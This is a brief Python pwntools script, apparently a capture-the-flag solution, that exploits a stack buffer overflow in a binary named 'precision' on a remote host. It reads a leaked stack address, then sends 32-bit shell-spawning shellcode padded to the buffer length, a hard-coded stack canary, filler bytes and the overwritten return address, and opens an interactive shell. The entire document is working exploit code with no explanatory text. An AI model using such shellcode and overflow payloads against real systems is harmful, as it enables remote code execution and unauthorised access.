from pwn import *

CANARY = '\xA5\x31\x5a\x47\x55\x15\x50\x40'
LEN_EXPLOIT = 128
shellcode = '\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4'

conn = remote('54.210.15.77', 1259)
#conn = process('./precision')
ret_addr = conn.recv().split(' ')[1]
ret_addr = struct.pack('<I', int(ret_addr, 16))

exploit = shellcode + 'A' * (LEN_EXPLOIT - len(shellcode)) + CANARY + 'B' * 12 + ret_addr

conn.send_raw(exploit)
conn.interactive()

